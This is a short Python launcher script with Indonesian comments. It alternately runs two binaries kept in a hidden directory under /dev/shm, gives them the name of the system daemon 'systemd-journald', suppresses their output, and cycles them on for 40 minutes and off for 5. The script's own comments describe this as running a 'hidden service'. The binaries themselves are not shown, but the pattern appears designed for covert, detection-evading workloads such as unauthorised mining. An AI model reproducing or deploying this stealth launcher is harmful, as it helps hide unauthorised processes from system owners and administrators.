import os
import time
import sys
import signal

# CONFIG
APP_PATHS = [
    "/dev/shm/.store/1/systemd-journald",
    "/dev/shm/.store/2/systemd-journald"
]
APP_NAME = "systemd-journald"
RUNTIME = 2400  # 40 menit
BREAKTIME = 300  # 5 menit

def stop_app():
    """Hentikan layanan tersembunyi."""
    os.system(f"pkill -f {APP_NAME}")
    print("🛑 Layanan tersembunyi dihentikan...")

def start_app(path):
    """Jalankan layanan tersembunyi."""
    print(f"▶️ Menjalankan layanan dari {path}...")
    command = f"nohup bash -c '{path}' > /dev/null 2>&1 &"
    os.system(command)
    time.sleep(5)

def main():
    index = 0
    while True:
        path = APP_PATHS[index]
        print(f"⚙️ Memulai tugas otomatis dari: {path}")
        start_app(path)
        time.sleep(RUNTIME)
        stop_app()
        print(f"⏸️ Istirahat selama {BREAKTIME // 60} menit...")
        time.sleep(BREAKTIME)
        
        # Ganti ke path berikutnya
        index = (index + 1) % len(APP_PATHS)

def sigint_handler(sig, frame):
    """Hentikan layanan kalau dihentikan manual."""
    print("📴 Layanan dihentikan manual...")
    stop_app()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    main()
